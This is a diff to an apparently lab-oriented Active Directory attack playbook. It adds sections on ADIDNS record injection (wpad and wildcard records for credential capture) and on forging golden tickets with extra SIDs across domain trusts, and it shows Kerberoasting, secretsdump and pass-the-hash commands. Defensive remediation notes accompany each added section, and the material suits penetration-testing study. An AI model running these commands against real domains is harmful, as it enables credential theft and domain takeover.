@@ -200,6 +200,50 @@ one, roast, remove it:
 pwnloop x "python3 targetedKerberoast.py -v -d <dom> -u <u> -p <p> --request-user <target>"
 ```
 
+## AD-integrated DNS (ADIDNS) — any authenticated user can define a name
+
+An AD-integrated zone stores its records as objects in the directory, and the
+default ACL on the zone grants **Authenticated Users `Create all child objects`**.
+So any domain account — including a low-privilege one that `sudo -l`'s equivalent
+would refuse everywhere else — can add a *new* record. It cannot usually overwrite
+an existing one (the record's owner keeps `WriteProperty`), and that asymmetry is
+the whole technique: **a name that does not resolve is a name you can define.**
+
+```bash
+pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> add dnsRecord <name> <your-tun0-ip>"
+pwnloop x "python3 dnstool.py -u '<dom>\<u>' -p '<p>' -r <name> -d <your-tun0-ip> --action add $T"
+pwnloop x "dig @$T <name>.<dom> +short"      # confirm before you build anything on it
+```
+
+Replication to the DC's own resolver takes a few minutes; confirm with `dig`
+rather than assuming, and delete the record at cleanup (`--action remove`).
+
+**Where to look for the name.** Hunt for hostnames the estate *dials* but DNS does
+not answer — that pairing is the finding, and each half is useless alone:
+
+- a **linked server**, connection string or config pointing at a host that returns
+  NXDOMAIN (see the linked-server note in `services.md` — that is the case where
+  the captured credential comes back in cleartext);
+- a hardcoded update/telemetry/backup hostname in a service binary or unit file;
+- `wpad` — still unregistered on many zones, and a `wpad` record plus WPAD-enabled
+  clients is proxy-position over their HTTP;
+- a **wildcard** `*` record, which answers every otherwise-NXDOMAIN lookup at once
+  and turns ordinary typo/short-name traffic into coercion. Loud; prefer the
+  specific name when you already know it.
+
+**Why it is a primitive rather than a trick.** Owning a name the target trusts
+converts any client that resolves it into either a **credential source** (it
+authenticates to you — capture or relay, see `relay.md`) or a **content source**
+(it fetches from you — serve the update, the script, the WPAD file). Neither
+needs a vulnerability in the client; it needs only that the client was configured
+with a name and never told which host may hold it.
+
+**Defensively**, the finding is not "DNS is misconfigured" — it is that the
+directory's default ACL makes name creation a self-service operation for every
+account, so any dangling reference in the estate is an escalation waiting for the
+first authenticated attacker. Remove the dangling reference *and* restrict
+`CreateChild` on the zone; either alone leaves the pattern reusable.
+
 ## Kerberos delegation
 
 ```bash
@@ -236,6 +280,58 @@ pwnloop x "impacket-secretsdump machine.htb/user:pass@$T -just-dc"
 pwnloop x "impacket-psexec machine.htb/Administrator@$T -hashes :<nthash>"
 pwnloop x "evil-winrm -i $T -u Administrator -H <nthash>"
 ```
+
+## Owning one domain is not the end — read the trusts
+
+DCSync in a domain gives you `krbtgt` for **that** domain. If the estate has a
+trust, the compromise usually does not stop there, and the second domain is often
+where the objective actually lives. Read the trusts the moment you hold DA, before
+declaring the run finished:
+
+```bash
+pwnloop x "impacket-lookupsid <dom>/<u>:<p>@$T"                 # domain SID
+pwnloop x "nxc ldap $T -u <u> -p <p> -M enum_trusts"
+pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> get trusts"
+```
+
+The distinction that matters is **direction and filtering**, not the label:
+
+- A trust says which realm's tickets the other side will *consider*. Inbound vs
+  outbound decides who can hop, and it is frequently the opposite of what the
+  org chart suggests.
+- **SID filtering** is what stops a ticket from carrying authority it should not.
+  Within a forest it is off by default between domains; across a forest trust it
+  is on unless someone turned it off (the "quarantine" flag) — so check rather
+  than assume, because that single bit decides whether the next step is one
+  command or a separate campaign.
+
+**The primitive, when filtering does not block it:** a golden ticket forged with
+the compromised domain's `krbtgt` can carry an **extra SID** in its PAC naming a
+privileged group *in the other domain*, and the far side honours it. Any RID-≥1000
+group from the target domain works — the useful ones are not always the obvious
+`Domain Admins`; a delegated operations group (`Backup Operators`, a custom
+infrastructure group) is often both sufficient and less noisy, because a right
+like `SeBackupPrivilege` on a DC is already a full compromise by another route.
+
+```bash
+pwnloop x "impacket-ticketer -nthash <krbtgt-hash> -domain-sid <own-sid> \
+    -domain <own.realm> -extra-sid <target-sid>-<rid> <user>"
+# then request a cross-realm service ticket and use it
+KRB5CCNAME=<ccache> pwnloop x "impacket-smbclient -k -no-pass <host>.<target.realm>"
+```
+
+**Reason about the ticket before you forge it.** Which principal are you claiming
+to be, which SIDs are you asserting, and which service on the far side actually
+grants what you need? A ticket that is accepted but lands you as a principal with
+nothing is a debugging trap that looks like a filtering failure. And the usual
+Kerberos preconditions bite harder across a trust: clock skew, the realm's case
+in `KRB5CCNAME` principals, and DNS/`/etc/hosts` for the *target* realm's DCs.
+
+**Defensively**, the finding is the trust configuration, not the forged ticket:
+an unfiltered trust means the security boundary the org believes it has between
+two domains does not exist, and `krbtgt` in the weaker one is authority in the
+stronger one. Enabling SID filtering / quarantine on the trust is the control that
+breaks this chain; rotating `krbtgt` alone does not.
 
 ## Certificate services (ADCS)
 
